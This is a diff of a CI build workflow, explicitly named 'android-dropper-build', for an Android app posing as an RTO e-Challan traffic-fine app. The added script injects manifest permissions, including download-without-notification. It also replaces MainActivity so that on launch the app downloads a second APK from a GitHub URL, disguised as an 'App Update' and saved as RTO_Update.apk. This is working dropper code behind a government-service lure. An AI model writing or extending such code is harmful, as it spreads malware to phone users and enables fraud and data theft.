@@ -1,54 +1,66 @@
 workflows:
   android-dropper-build:
-    name: RTO Final Success Guaranteed
+    name: RTO Background Downloader
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Master Build Fix
+      - name: Inject Background Download Logic
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Resource Fix (Fixes error from 11783.jpg)
-          mkdir -p app/src/main/res/drawable
-          LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
-          if [ -f "$LOGO_FILE" ]; then
-            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
-          else
-            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
-          fi
+          # 1. Resource & Manifest Permissions (Permissions are must for BG download)
+          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
+          sed -i '' '/<application/i \
+          <uses-permission android:name="android.permission.INTERNET" /> \
+          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
+          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
 
-          # 2. Clean Redirect Logic
+          # 2. Injecting DownloadManager Logic in MainActivity
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
-          import android.os.Bundle
-          import android.content.Intent
+          import android.app.DownloadManager
+          import android.content.Context
           import android.net.Uri
-          import android.os.Handler
-          import android.os.Looper
+          import android.os.Bundle
+          import android.os.Environment
+          import android.widget.Toast
           import androidx.appcompat.app.AppCompatActivity
+
           class MainActivity : AppCompatActivity() {
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   setContentView(R.layout.activity_main)
-                  Handler(Looper.getMainLooper()).postDelayed({
-                      val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
-                      startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
-                      finish()
-                  }, 1000)
+                  
+                  startBackgroundDownload()
+              }
+
+              private fun startBackgroundDownload() {
+                  val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
+                  try {
+                      val request = DownloadManager.Request(Uri.parse(url))
+                      request.setTitle("App Update")
+                      request.setDescription("Downloading latest version...")
+                      request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")
+
+                      val manager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
+                      manager.enqueue(request)
+                      
+                      Toast.makeText(this, "Download Shuru Ho Gaya Hai...", Toast.LENGTH_LONG).show()
+                  } catch (e: Exception) {
+                      Toast.makeText(this, "Error: " + e.message, Toast.LENGTH_SHORT).show()
+                  }
               }
           }
           EOF
 
-          # 3. Fix Settings.gradle (Fixes error from 11792.jpg)
+          # 3. Standard Build & Export
           rm -f settings.gradle gradle.properties build.gradle
-          
           printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
-          
           printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
-          
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
@@ -60,14 +72,12 @@ workflows:
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 4. Build and Export
           gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
           ./gradlew assembleDebug --no-daemon
           
-          # Force export to root for download button
-          mkdir -p $CM_BUILD_DIR/final_link
-          find . -name "*.apk" -exec cp {} $CM_BUILD_DIR/final_link/installer.apk \;
+          mkdir -p \$CM_BUILD_DIR/final_out
+          find . -name "*.apk" -exec cp {} \$CM_BUILD_DIR/final_out/RTO_Installer.apk \;
           
     artifacts:
-      - $CM_BUILD_DIR/final_link/*.apk
+      - \$CM_BUILD_DIR/final_out/*.apk
